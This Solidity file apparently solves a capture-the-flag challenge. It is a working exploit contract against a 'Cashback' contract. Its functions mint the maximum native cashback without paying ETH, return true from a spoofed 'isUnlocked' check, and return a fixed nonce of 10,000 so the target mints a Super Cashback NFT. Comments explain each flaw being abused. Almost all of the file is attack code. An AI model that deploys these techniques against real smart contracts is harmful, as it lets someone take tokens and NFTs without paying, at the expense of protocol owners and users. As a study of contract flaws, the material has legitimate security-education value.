// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import {Currency} from "./Cashback.sol";
import {IERC1155} from "openzeppelin-contracts-v5.4.0/token/ERC1155/IERC1155.sol";
import {IERC721} from "openzeppelin-contracts-v5.4.0/token/ERC721/IERC721.sol";

import {console} from "forge-std/Test.sol";

interface ICashback {
    function accrueCashback(Currency currency, uint256 amount) external;
}

contract NativeDelegationLogic {
    address public constant NATIVE_CURRENCY = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
    uint256 public constant SUPERCASHBACK_NONCE = 10000;

    address public immutable cashback;
    address public immutable player;
    address public immutable superCashbackNFT;

    constructor(address _cashback, address _player, address _superCashbackNFT) {
        cashback = _cashback;
        player = _player;
        superCashbackNFT = _superCashbackNFT;
    }

    /**
     * @notice Exploits Cashback by minting the maximum NATIVE cashback without sending real ETH.
     *
     * @dev This function directly calls `accrueCashback` for the native currency.
     *      - We pass `200 ether` so that:
     *            cashback = amount * rate / BASIS_POINTS = 200 * 0.5% = 1 ether (max)
     *      - The forged caller passes the required checks and receives the ERC1155 cashback points.
     *      - No real ETH transfer is verified.
     *      - The minted cashback is transferred to the player.
     *
     * @custom:insight The vulnerability is that `accrueCashback` trusts the input `amount`
     *                 without verifying that an actual ETH payment occurred.
     */
    function attackNativeCashback() external {
        ICashback(cashback).accrueCashback(Currency.wrap(NATIVE_CURRENCY), 200 ether);

        uint256 nativeId = Currency.wrap(NATIVE_CURRENCY).toId();

        uint256 balance = IERC1155(cashback).balanceOf(address(this), nativeId);

        IERC1155(cashback).safeTransferFrom(address(this), player, nativeId, balance, "");
    }

    /**
     * @notice Bypasses the `onlyUnlocked` modifier in Cashback.
     *
     * @dev Cashback checks:
     *      `Cashback(payable(msg.sender)).isUnlocked()`
     *      to ensure the caller is in an "unlocked" state.
     *
     *      By always returning `true`, this contract tricks Cashback into
     *      believing the caller is unlocked, even though no real unlock
     *      mechanism (transient storage) was used.
     *
     * @custom:insight This works because Cashback trusts an external call
     *                 to `msg.sender` instead of enforcing the state internally.
     */
    function isUnlocked() external pure returns (bool) {
        return true;
    }

    /**
     * @notice Forces Cashback to mint the Super Cashback NFT.
     *
     * @dev Cashback calls:
     *      `Cashback(payable(msg.sender)).consumeNonce()`
     *      and expects a monotonically increasing nonce.
     *
     *      By always returning `10_000`, we directly satisfy the condition:
     *          `if (newNonce == 10_000)`
     *      which triggers the NFT mint without performing 10,000 real operations.
     *
     * @custom:insight The contract does not verify that the nonce is actually
     *                 stored or incremented, allowing full control over its value.
     */
    function consumeNonce() external pure returns (uint256) {
        return SUPERCASHBACK_NONCE;
    }
}
